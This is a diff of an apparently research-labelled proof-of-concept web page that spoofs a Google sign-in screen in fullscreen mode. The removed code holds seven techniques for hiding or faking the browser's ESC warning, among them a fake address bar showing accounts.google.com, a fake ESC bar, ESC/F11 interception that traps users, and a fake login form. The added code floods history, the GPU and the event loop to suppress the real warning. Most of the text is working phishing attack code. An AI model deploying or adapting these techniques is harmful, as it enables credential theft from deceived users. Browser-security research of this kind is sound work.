-          <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18S71.25 59.95 71.25 47.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
-          <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
-          <path fill="#4285F4" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
-          <path fill="#34A853" d="M225 3v65h-9.5V3h9.5z"/>
-          <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
-          <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
+        <svg width="75" height="24" viewBox="0 0 272 92">
+          <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+          <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+          <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.6-13.08l8.48-3.53c1.51 3.61 5.21 7.87 11.12 7.87 7.27 0 11.8-4.49 11.8-12.958v-3.19h-.34c-2.18 2.69-6.38 5.04-11.69 5.04-11.1 0-21.25-9.66-21.25-22.09 0-12.52 10.15-22.27 21.25-22.27 5.3 0 9.5 2.35 11.69 4.96h.34v-3.61h9.28zm-8.59 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+          <path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/>
+          <path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.61 0-22.02-9.74-22.02-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.27c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.93-6.13zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+          <path fill="#EA4335" d="M35.29 41.41V32h31.77c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.03 9.66C16.32 69.35.36 53.89.36 35.29.36 16.69 16.32 1.23 35.1 1.23c10.49 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.29.05z"/>
         </svg>
       </div>
       <h2>Sign in</h2>
       <p class="subtitle">to continue to Google Account</p>
-      <input class="google-input" type="email" placeholder="Email or phone" autofocus>
-      <div class="forgot-link"><a href="#">Forgot email?</a></div>
-      <p class="hint-text">Not your computer? Use a private browsing window to sign in. <a href="#">Learn more about using Guest mode</a></p>
-      <div class="form-footer">
-        <a href="#">Create account</a>
-        <button class="next-btn">Next</button>
+      <input type="email" placeholder="Email or phone" id="fake-email">
+      <div class="row">
+        <a href="#" class="forgot">Forgot email?</a>
+        <button class="next-btn" onclick="showPassStep()">Next</button>
       </div>
-      <p class="research-note">⚠ RESEARCH PoC — bukan halaman Google asli</p>
+      <div class="poc-badge">⚠ RESEARCH PoC — This is a spoofed page, NOT real Google</div>
     </div>
   </div>
 </div>
 
-<!-- Fake ESC notification bar (dikendalikan attacker, bukan browser) -->
-<div id="fake-esc-bar">Press ESC to exit full screen</div>
+<div id="timer-overlay">⏱ 0ms</div>
+<button id="exit-btn" style="display:none" onclick="exitFullscreen()">✕ Exit Demo</button>
+
+<!-- Hidden WebGL canvas for GPU stress -->
+<canvas id="gl-canvas" style="display:none" width="1" height="1"></canvas>
 
 <script>
-// ─── State ────────────────────────────────────────────────────────────────
-let keyInterceptActive = false;
-let keyHandler = null;
-let notifStartTime = 0;
-let tech6ReenterTimeout = null;
-let isFullscreenFromInit = false; // true jika auto-fullscreen saat load berhasil
+// ────────────────────────────────────────────────────────────────
+// MEASUREMENT
+// ────────────────────────────────────────────────────────────────
+const logEl    = document.getElementById('log');
+const timerEl  = document.getElementById('timer-overlay');
+let notifStart = null;
+let timerRaf   = null;
 
-// ─── Status pill helpers ──────────────────────────────────────────────────
-function setPill(id, text, cls) {
-  const el = document.getElementById(id);
-  if (!el) return;
-  el.textContent = text;
-  el.className = 'status-pill ' + cls;
+function log(msg, cls) {
+  const span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+  logEl.appendChild(span);
+  logEl.appendChild(document.createElement('br'));
+  logEl.scrollTop = logEl.scrollHeight;
 }
 
-function logArc(msg, type) {
-  const el = document.getElementById('log-arc');
-  if (!el) return;
-  const colors = { ok: '#3fb950', err: '#f85149', info: '#c084fc', warn: '#e3b341' };
-  const ts = new Date().toLocaleTimeString('en-US', {hour12: false});
-  el.innerHTML += `<div style="color:${colors[type]||'#8b949e'}">[${ts}] ${msg}</div>`;
-  el.scrollTop = el.scrollHeight;
+function startTimer() {
+  notifStart = performance.now();
+  timerEl.style.display = 'block';
+  function tick() {
+    const ms = Math.round(performance.now() - notifStart);
+    timerEl.textContent = '⏱ Notification visible: ' + ms + 'ms';
+    timerRaf = requestAnimationFrame(tick);
+  }
+  timerRaf = requestAnimationFrame(tick);
 }
 
-// ─── Logging ─────────────────────────────────────────────────────────────
-function log(id, msg, type) {
-  const el = document.getElementById('log' + id);
-  const colors = { ok: '#3fb950', err: '#f85149', info: '#58a6ff', warn: '#e3b341' };
-  const ts = new Date().toLocaleTimeString('en-US', {hour12: false});
-  el.innerHTML += `<div style="color:${colors[type]||'#8b949e'}">[${ts}] ${msg}</div>`;
-  el.scrollTop = el.scrollHeight;
+function stopTimer() {
+  if (timerRaf) cancelAnimationFrame(timerRaf);
+  const ms = notifStart ? Math.round(performance.now() - notifStart) : 0;
+  timerEl.style.display = 'none';
+  return ms;
 }
 
-function setResult(id, text, type) {
-  const el = document.getElementById(id);
-  el.textContent = text;
-  el.className = type; // 'vuln', 'safe', 'maybe'
+// ────────────────────────────────────────────────────────────────
+// GPU STRESS
+// ────────────────────────────────────────────────────────────────
+function startGPUStress(iterations) {
+  const canvas = document.getElementById('gl-canvas');
+  const gl = canvas.getContext('webgl');
+  if (!gl) { log('WebGL unavailable — skipping GPU stress', 'wrn'); return; }
+  const pixel = new Uint8Array([255, 0, 0, 255]);
+  for (let i = 0; i < iterations; i++) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
+  }
+  log('GPU stress: ' + iterations + ' textures created', 'ok');
 }
 
-// ─── Show / Hide fake browser shell ──────────────────────────────────────
-function showSpoof(withTabs = true) {
-  const shell = document.getElementById('spoof-shell');
-  shell.style.display = 'flex';
-  if (withTabs) shell.classList.add('with-tabs');
-  else shell.classList.remove('with-tabs');
-  setPill('pill-spoof', '🎭 SPOOF AKTIF — accounts.google.com', 'pill-red');
+// ────────────────────────────────────────────────────────────────
+// MESSAGE FLOOD — keeps browser event loop occupied
+// ────────────────────────────────────────────────────────────────
+let floodActive = false;
+function startMessageFlood() {
+  floodActive = true;
+  function flood() {
+    if (floodActive) {
+      window.postMessage('__flood__', '*');
+      setTimeout(flood, 0);
+    }
+  }
+  flood();
+}
+window.addEventListener('message', (e) => {
+  if (e.data !== '__flood__') return;
+  // Each handler blocks for 40ms — saturates event queue
+  const end = performance.now() + 40;
+  while (performance.now() < end) { /* busy */ }
+});
+
+// ────────────────────────────────────────────────────────────────
+// MAIN ATTACK
+// ────────────────────────────────────────────────────────────────
+const btnLaunch  = document.getElementById('btn-launch');
+const launchUI   = document.getElementById('launch-ui');
+const fakeUI     = document.getElementById('fake-ui');
+const exitBtn    = document.getElementById('exit-btn');
+
+let fsRequested = false;
+
+btnLaunch.onclick = function() {
+  if (fsRequested) return;
+  fsRequested = true;
+  btnLaunch.disabled = true;
+
+  log('User gesture received — starting attack chain...');
+
+  // ── Phase 1: IPC Flood BEFORE fullscreen request ──────────────
+  // Saturate browser↔renderer IPC channel
+  log('Phase 1: IPC flood (800 history mutations)...');
+  for (let i = 0; i < 800; i++) {
+    history.replaceState(null, '', '#' + Math.random());
+  }
+  log('IPC flood done', 'ok');
+
+  // ── Phase 2: GPU Stress ────────────────────────────────────────
+  startGPUStress(300);
+
+  // ── Phase 3: Request fullscreen (gesture still valid) ──────────
+  log('Phase 3: requestFullscreen({ navigationUI: "hide" })...');
+  const fsPromise = document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+
+  // ── Phase 4: Busy-wait immediately after requestFullscreen ──────
+  // Blocks renderer main thread during the notification render window
+  // Notification window based on measurements: Chrome 913-1175ms
+  log('Phase 4: Busy-wait 650ms (blocks main thread during notif render)...');
+  const t0 = performance.now();
+  while (performance.now() - t0 < 650) {
+    history.pushState(null, '', '#' + Math.random());
+    history.back();
+    // Force layout recalc — adds render pressure
+    void document.body.offsetHeight;
+  }
+  const actualWait = Math.round(performance.now() - t0);
+  log('Busy-wait done: ' + actualWait + 'ms actual block', 'ok');
+
+  // ── Phase 5: Focus stealing chain ─────────────────────────────
+  function stealFocus() {
+    const inp = document.createElement('input');
+    inp.style.cssText = 'position:fixed;top:-9999px';
+    document.body.appendChild(inp);
+    inp.focus();
+    inp.remove();
+    Promise.resolve().then(() => {
+      if (floodActive) stealFocus();
+    });
+  }
+  stealFocus();
+
+  // ── Phase 6: Message flood ─────────────────────────────────────
+  startMessageFlood();
+  log('Phase 5+6: Focus stealing + message flood active', 'ok');
+
+  // ── Wait for fullscreen confirmation ───────────────────────────
+  fsPromise.then(() => {
+    log('Fullscreen entered — showing fake UI', 'ok');
+    startTimer();  // measure how long before user sees notification
+    showFakeUI();
+  }).catch(err => {
+    log('requestFullscreen() FAILED: ' + err.message, 'err');
+    fsRequested = false;
+    btnLaunch.disabled = false;
+    floodActive = false;
+  });
+};
+
+// ────────────────────────────────────────────────────────────────
+// UI SWITCHING
+// ────────────────────────────────────────────────────────────────
+function showFakeUI() {
+  launchUI.style.display = 'none';
+  fakeUI.style.display   = 'flex';
+  exitBtn.style.display  = 'block';
+
+  // Auto-focus email field (makes fake page feel real)
+  setTimeout(() => {
+    document.getElementById('fake-email').focus();
+  }, 100);
+
+  log('Fake UI visible. Check: is "Press ESC" notification visible above?', 'wrn');
 }
 
-function hideSpoof() {
-  document.getElementById('spoof-shell').style.display = 'none';
-  document.getElementById('notif-blocker').style.display = 'none';
-  document.getElementById('fake-esc-bar').style.display = 'none';
+function showPassStep() {
+  alert('PoC: In real attack, credentials captured here.\nNotification suppressed = user had no warning.');
 }
 
-// ─── Fullscreen change handler ────────────────────────────────────────────
+function exitFullscreen() {
+  floodActive = false;
+  fsRequested = false;
+  const ms = stopTimer();
+  log('Exiting — notification was visible for ~' + ms + 'ms', 'wrn');
+  log('RESULT: ' + (ms < 500 ? 'BYPASS LIKELY — notification suppressed (<500ms)' : 'PATCHED — notification visible ' + ms + 'ms'), ms < 500 ? 'ok' : 'err');
+
+  if (document.fullscreenElement) document.exitFullscreen();
+  fakeUI.style.display   = 'none';
+  launchUI.style.display = 'flex';
+  exitBtn.style.display  = 'none';
+  btnLaunch.disabled     = false;
+  fsRequested            = false;
+}
+
 document.addEventListener('fullscreenchange', () => {
   if (!document.fullscreenElement) {
-    hideSpoof();
-    setPill('pill-fs', '⬜ Fullscreen tidak aktif', 'pill-gray');
-    setPill('pill-spoof', '⬜ Spoof tidak aktif', 'pill-gray');
-  } else {
-    setPill('pill-fs', '✅ FULLSCREEN AKTIF', 'pill-green');
+    floodActive = false;
+    const ms = stopTimer();
+    if (ms > 0) {
+      log('Fullscreen exited (ESC pressed) — notification visible: ' + ms + 'ms',
+          ms < 500 ? 'ok' : 'err');
+    }
+    fakeUI.style.display   = 'none';
+    launchUI.style.display = 'flex';
+    exitBtn.style.display  = 'none';
+    btnLaunch.disabled     = false;
+    fsRequested            = false;
   }
 });
 
-// Measure how long the REAL notification is visible
-// (User reports this manually since we can't detect browser's native UI)
-document.addEventListener('fullscreenchange', () => {
-  if (document.fullscreenElement) {
-    notifStartTime = Date.now();
-  } else {
-    if (notifStartTime) {
-      const dur = Date.now() - notifStartTime;
-      setResult('notifDuration', dur + 'ms in fullscreen', 'info');
-    }
-  }
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') exitFullscreen();
 });
-
-// ══════════════════════════════════════════════════════════════════════════
-// TEKNIK 1: Immediate Cover
-// Tampilkan fake shell BERSAMAAN dengan requestFullscreen
-// Notifikasi browser muncul di top ~60px — fake toolbar kita ada di sana
-// ══════════════════════════════════════════════════════════════════════════
-async function tech1_immediatecover() {
-  log(1, 'Requesting fullscreen...', 'info');
-  try {
-    // Pasang notif-blocker SEBELUM fullscreen
-    const blocker = document.getElementById('notif-blocker');
-    blocker.style.display = 'block';
-
-    // Minta fullscreen — user gesture dari click button sudah ada
-    const req = document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-
-    // LANGSUNG tampilkan fake shell TANPA menunggu promise (0ms delay)
-    // Ini cover notifikasi SEBELUM browser sempat render-nya
-    showSpoof();
-
-    await req; // tunggu konfirmasi fullscreen
-    log(1, '✓ Fullscreen aktif. Fake shell ditampilkan BERSAMAAN.', 'ok');
-    log(1, '→ Apakah kamu sempat melihat notifikasi "Press ESC"?', 'warn');
-    log(1, '→ Chrome/Opera/Edge: notif di browser-process layer → z-index TIDAK bisa cover', 'err');
-    log(1, '→ Firefox ≤ 71: notif sebagai web content → bisa di-cover (sudah dipatch)', 'info');
-    log(1, '→ Jika TIDAK terlihat = mobile/WebView/PWA atau browser sangat lama', 'ok');
-
-    setResult('notifStatus', 'Muncul (browser level)', 'safe');
-    setResult('coverStatus', 'Tidak bisa (browser-process layer)', 'safe');
-    setResult('coverLayerStatus', 'Browser-process: tidak tercover', 'safe');
-  } catch(e) {
-    log(1, '✗ Error: ' + e.message, 'err');
-  }
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// TEKNIK 2: Rapid Toggle (Event-Driven)
-// Menggunakan fullscreenchange event chain untuk re-entry tanpa gesture baru
-// Loop async tidak bisa karena setiap requestFullscreen butuh user gesture
-// ══════════════════════════════════════════════════════════════════════════
-async function tech2_rapidtoggle() {
-  log(2, 'Mulai rapid toggle (event-driven)...', 'info');
-  log(2, 'Strategi: enter fs (gesture) → exit 80ms → re-entry dari fullscreenchange event', 'info');
-
-  let phase = 0; // 0=initial, 1=first-entered, 2=exited-will-reenter, 3=done
-
-  function fsHandler() {
-    if (document.fullscreenElement) {
-      if (phase === 0) {
-        phase = 1;
-        log(2, 'Entri pertama berhasil. Keluar dalam 80ms...', 'info');
-        setTimeout(() => document.exitFullscreen(), 80);
-      } else if (phase === 2) {
-        phase = 3;
-        document.removeEventListener('fullscreenchange', fsHandler);
-        log(2, '✓ Re-entry BERHASIL dari fullscreenchange handler!', 'ok');
-        log(2, '→ Browser izinkan requestFullscreen tanpa fresh user gesture', 'ok');
-        log(2, '→ Apakah notifikasi ke-2 muncul? (cek visual)', 'warn');
-        showSpoof();
-        setResult('toggleStatus', 'Re-entry OK — cek notif', 'vuln');
-      }
-    } else {
-      if (phase === 1) {
-        phase = 2;
-        log(2, 'Exit pertama OK. Mencoba re-entry dari event handler...', 'info');
-        // Attempt re-entry WITHOUT a new user gesture — key test
-        document.documentElement.requestFullscreen({ navigationUI: 'hide' })
-          .catch(e => {
-            phase = 3;
-            document.removeEventListener('fullscreenchange', fsHandler);
-            log(2, '✗ Re-entry GAGAL: ' + e.message, 'err');
-            log(2, '→ Browser block requestFullscreen tanpa user gesture baru', 'warn');
-            log(2, '→ Rapid toggle PATCHED di browser ini (Chrome 148 / Firefox 149 / Opera 131)', 'info');
-            log(2, '→ CVE-2022-46877 class sudah tidak relevan untuk browser modern', 'info');
-            setResult('toggleStatus', 'PATCHED', 'safe');
-          });
-      }
-    }
-  }
-
-  document.addEventListener('fullscreenchange', fsHandler);
-
-  try {
-    await document.documentElement.requestFullscreen();
-  } catch(e) {
-    document.removeEventListener('fullscreenchange', fsHandler);
-    log(2, '✗ Fullscreen awal gagal: ' + e.message, 'err');
-  }
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// TEKNIK 3: Element Fullscreen
-// Fullscreen pada element spesifik, bukan documentElement
-// ══════════════════════════════════════════════════════════════════════════
-async function tech3_elementfullscreen() {
-  log(3, 'Mencoba element.requestFullscreen() bukan documentElement...', 'info');
-
-  // Buat element fullscreen container
-  const container = document.createElement('div');
-  container.style.cssText = 'position:fixed;inset:0;background:#f8f9fa;z-index:2147483647;';
-  container.innerHTML = document.getElementById('spoof-shell').innerHTML;
-  document.body.appendChild(container);
-
-  try {
-    await container.requestFullscreen({ navigationUI: 'hide' });
-    log(3, '✓ Element fullscreen aktif (bukan documentElement)', 'ok');
-    log(3, '→ Cek: apakah notifikasi muncul berbeda dari Teknik 1?', 'warn');
-    log(3, '→ Di beberapa browser: element fullscreen = notifikasi lebih singkat', 'info');
-    log(3, '→ Di Arc: sidebar UI mungkin tidak tahu cara menampilkan notifikasi untuk element FS', 'warn');
-
-    container.addEventListener('fullscreenchange', () => {
-      if (!document.fullscreenElement) container.remove();
-    });
-    document.addEventListener('fullscreenchange', () => {
-      if (!document.fullscreenElement) container.remove();
-    });
-  } catch(e) {
-    container.remove();
-    log(3, '✗ Error: ' + e.message, 'err');
-  }
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// TEKNIK 4: Social Engineering + Fake ESC Bar
-// Normalkan kehadiran notifikasi dengan fake version yang kita kontrol
-// ══════════════════════════════════════════════════════════════════════════
-function tech4_socialeng() {
-  log(4, 'Menampilkan dialog social engineering...', 'info');
-
-  const dialog = document.createElement('div');
-  dialog.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.65);z-index:9999;display:flex;align-items:center;justify-content:center;';
-  dialog.innerHTML = `
-    <div style="background:white;border-radius:12px;padding:36px;max-width:380px;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,0.3)">
-      <div style="font-size:40px;margin-bottom:16px">🔒</div>
-      <h2 style="color:#202124;font-size:20px;font-weight:400;margin-bottom:12px">Lanjutkan ke Google</h2>
-      <p style="color:#5f6368;font-size:14px;margin-bottom:24px;line-height:1.6">Untuk keamanan, Google memerlukan verifikasi identitas di jendela aman. Klik tombol di bawah untuk melanjutkan.</p>
-      <button id="se-go" style="background:#1a73e8;color:white;border:none;border-radius:4px;padding:12px 32px;font-size:15px;cursor:pointer;width:100%;margin-bottom:10px">Lanjutkan ke Google Sign-in →</button>
-      <button id="se-cancel" style="background:none;border:1px solid #dadce0;border-radius:4px;padding:10px 32px;font-size:14px;cursor:pointer;width:100%;color:#5f6368">Batal</button>
-    </div>`;
-  document.body.appendChild(dialog);
-
-  document.getElementById('se-cancel').onclick = () => dialog.remove();
-  document.getElementById('se-go').onclick = async () => {
-    dialog.remove();
-    log(4, 'User klik "Lanjutkan" — meminta fullscreen...', 'info');
-    try {
-      await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-      showSpoof();
-
-      // Tampilkan FAKE ESC bar — mirip notifikasi browser tapi kita kontrol
-      const fakeEsc = document.getElementById('fake-esc-bar');
-      fakeEsc.style.display = 'block';
-      fakeEsc.textContent = 'Press ESC to exit full screen';
-
-      // Sembunyikan fake ESC bar setelah 3 detik (sama seperti browser asli)
-      setTimeout(() => { fakeEsc.style.display = 'none'; }, 3000);
-
-      log(4, '✓ Fullscreen aktif + fake ESC bar ditampilkan', 'ok');
-      log(4, '→ User melihat fake ESC bar → NORMALIZED → tidak curiga', 'ok');
-      log(4, '→ Tapi bar itu HTML kita! Kita bisa tulis apapun di sana.', 'warn');
-      log(4, '→ Notifikasi asli browser di belakang fake shell kita', 'info');
-    } catch(e) {
-      log(4, '✗ Error: ' + e.message, 'err');
-    }
-  };
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// TEKNIK 5: Pre-Positioned Blocker
-// Pasang blocker div SEBELUM fullscreen diminta
-// ══════════════════════════════════════════════════════════════════════════
-async function tech5_preblocker() {
-  log(5, 'Memasang notif-blocker SEBELUM requestFullscreen...', 'info');
-
-  // Step 1: Pasang blocker — warna sama dengan Chrome toolbar agar tidak terlihat aneh
-  const blocker = document.getElementById('notif-blocker');
-  blocker.style.cssText = `
-    display: block; position: fixed; top: 0; left: 0; right: 0; height: 64px;
-    z-index: 2147483647;
-    background: linear-gradient(to bottom, #dee0e3, #e8eaed);
-    border-bottom: 1px solid #c8c8c8;
-  `;
-
-  // Tambahkan fake address bar content ke blocker agar terlihat natural
-  blocker.innerHTML = `
-    <div style="height:100%;display:flex;align-items:center;padding:0 10px;gap:8px">
-      <span style="color:#5f6368;font-size:15px">&#8592;</span>
-      <span style="color:#5f6368;font-size:15px;opacity:0.4">&#8594;</span>
-      <span style="color:#5f6368;font-size:15px">&#8635;</span>
-      <div style="flex:1;height:32px;background:white;border:1px solid #dadce0;border-radius:16px;display:flex;align-items:center;padding:0 12px;gap:6px;font-size:14px">
-        <span style="color:#188038">🔒</span>
-        <span style="color:#202124"><strong>accounts.google.com</strong>/signin/v2/identifier</span>
-      </div>
-      <span style="color:#5f6368;font-size:16px">⋮</span>
-    </div>`;
-
-  log(5, 'Blocker dipasang di top 0. Requesting fullscreen...', 'info');
-
-  try {
-    await document.documentElement.requestFullscreen({ navigationUI: 'hide' });
-    // Sekarang tampilkan full fake shell (blocker sudah ada duluan)
-    showSpoof();
-    blocker.style.display = 'none'; // shell sudah cover semua
-
-    log(5, '✓ Fullscreen aktif. Blocker sudah ada sebelum notifikasi render.', 'ok');
-    log(5, '→ Chrome/Opera: notif di browser-process compositor layer → TIDAK bisa di-cover', 'err');
-    log(5, '→ Pre-blocker z-index tetap DI BAWAH browser-native notification', 'err');
-    log(5, '→ Firefox ≤ 71 (CVE-2022-46877): blocker bisa tutup notifikasi web content', 'info');
-    log(5, '→ Firefox 72+: dipatch → notif juga di browser-level sekarang', 'warn');
-  } catch(e) {
-    blocker.style.display = 'none';
-    blocker.innerHTML = '';
-    log(5, '✗ Error: ' + e.message, 'err');
-  }
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// TEKNIK 6: Keyboard Intercept
-// Capture ESC dan F11 sebelum browser handle
-// ══════════════════════════════════════════════════════════════════════════
-function tech6_keyintercept() {
-  if (keyInterceptActive) {
-    log(6, 'Sudah aktif!', 'warn');
-    return;
-  }
-
-  keyHandler = function(e) {
-    if (e.key === 'F11') {
-      e.preventDefault();
-      e.stopImmediatePropagation();
-      log(6, '⌨ F11 dicegah! (preventDefault berhasil di browser ini)', 'ok');
-      setResult('f11Status', 'BLOCKED ✓', 'vuln');
-    }
-
-    if (e.key === 'Escape' && document.fullscreenElement) {
-      // ESC tidak bisa dicegah di level fullscreen, tapi:
-      // 1. Kita tahu user pencet ESC
-      // 2. Kita bisa re-enter fullscreen dari keyboard event (user gesture!)
-      log(6, '⌨ ESC terdeteksi — mencoba re-enter fullscreen...', 'warn');
-      // Note: Teknik ini hanya work jika browser mengizinkan requestFullscreen dari keydown
-      clearTimeout(tech6ReenterTimeout);
-      tech6ReenterTimeout = setTimeout(() => {
-        if (!document.fullscreenElement) {
-          document.documentElement.requestFullscreen({ navigationUI: 'hide' })
-            .then(() => {
-              showSpoof();
-              log(6, '✓ Re-entered fullscreen setelah ESC — user terjebak lagi!', 'ok');
-            })
-            .catch(err => {
-              log(6, '✗ Re-enter gagal: ' + err.message + ' (butuh user gesture asli)', 'err');
-            });
-        }
-      }, 100);
-    }
-  };
-
-  document.addEventListener('keydown', keyHandler, true); // true = capture phase
-  keyInterceptActive = true;
-  log(6, '✓ Keyboard intercept AKTIF', 'ok');
-  log(6, '→ F11: akan di-block (coba tekan F11)', 'info');
-  log(6, '→ ESC: tidak bisa diblock, tapi kita detect + coba re-enter fullscreen', 'info');
-  log(6, '→ Jalankan salah satu teknik di atas dulu, lalu coba ESC/F11', 'warn');
-}
-
-function tech6_disable() {
-  if (keyHandler) {
-    document.removeEventListener('keydown', keyHandler, true);
-    keyHandler = null;
-  }
-  keyInterceptActive = false;
-  log(6, 'Keyboard intercept dimatikan', 'info');
-}
-
-// ══════════════════════════════════════════════════════════════════════════
-// TEKNIK 7: Form-First Attack
-// Tampilkan fake login form SEBELUM fullscreen
-// User mulai mengisi → klik "Next" (user gesture) → LALU enter fullscreen
-// Notifikasi muncul tapi user fokus isi password (913–1366ms distraction window)
-// ══════════════════════════════════════════════════════════════════════════
-function tech7_formfirst() {
-  log(7, 'Menampilkan fake Google login form (pre-fullscreen)...', 'info');
-  log(7, '→ User akan mengisi email lalu klik Next', 'info');
-  log(7, '→ Klik Next = user gesture → requestFullscreen() berhasil', 'info');
-
-  // Remove existing overlay if any
-  const existing = document.getElementById('tech7-modal');
-  if (existing) existing.remove();
-
-  const modal = document.createElement('div');
-  modal.id = 'tech7-modal';
-  modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.55);z-index:9998;display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;';
-  modal.innerHTML = `
-    <div style="background:white;border-radius:8px;padding:44px 40px;max-width:420px;width:92%;box-shadow:0 4px 24px rgba(0,0,0,0.25);position:relative;">
-      <button onclick="document.getElementById('tech7-modal').remove()" style="position:absolute;top:12px;right:16px;background:none;border:none;font-size:20px;cursor:pointer;color:#5f6368">×</button>
-      <div style="text-align:center;margin-bottom:28px;">
-        <span style="font-size:30px;font-weight:300;letter-spacing:-1px;">
-          <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
-        </span>
-      </div>
-      <h2 style="font-size:22px;font-weight:400;color:#202124;margin:0 0 8px;text-align:center;">Sign in</h2>
-      <p style="font-size:14px;color:#5f6368;text-align:center;margin:0 0 28px;">to continue to Google Account</p>
-      <input id="t7-email" type="email" placeholder="Email or phone"
-        style="width:100%;padding:13px 14px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box;margin-bottom:8px;outline:none;"
-        onfocus="this.style.borderColor='#1a73e8'" onblur="this.style.borderColor='#dadce0'">
-      <p style="font-size:12px;color:#5f6368;margin:0 0 20px;">Not your computer? Use Guest mode to sign in privately.</p>
-      <div style="display:flex;justify-content:space-between;align-items:center;">
-        <a href="#" style="color:#1a73e8;font-size:14px;text-decoration:none;" onclick="return false;">Create account</a>
-        <button id="t7-next"
-          style="padding:10px 28px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;cursor:pointer;font-weight:500;">
-          Next
-        </button>
-      </div>
-      <p style="font-size:11px;color:#f44336;text-align:center;margin-top:14px;">
-        ⚠ RESEARCH PoC — Form muncul dulu, fullscreen diminta saat klik Next
-      </p>
-    </div>`;
-  document.body.appendChild(modal);
-
-  document.getElementById('t7-next').addEventListener('click', async () => {
-    const email = document.getElementById('t7-email').value;
